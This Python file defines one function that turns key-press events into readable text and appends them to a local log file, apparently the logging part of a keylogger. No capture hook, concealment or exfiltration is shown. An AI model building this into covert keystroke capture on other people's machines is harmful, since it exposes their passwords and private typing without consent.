from typing import Dict, Union
from pathlib import Path


def writeLog(key, logfile: Union[str, Path]="log.txt" ) -> None:
    """
    Write the key pressed to the log file.
    """
    translate_keys: Dict[str, str] = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": " ENTER ",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.tab": "",
        "Key.ctrl_l": "",
        "Key.backspace": " BACKSPACE ",
    }

    keydata = str(key)

    keydata = keydata.replace("'", "")

    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    with open(logfile, "a") as f:
        f.write(keydata)

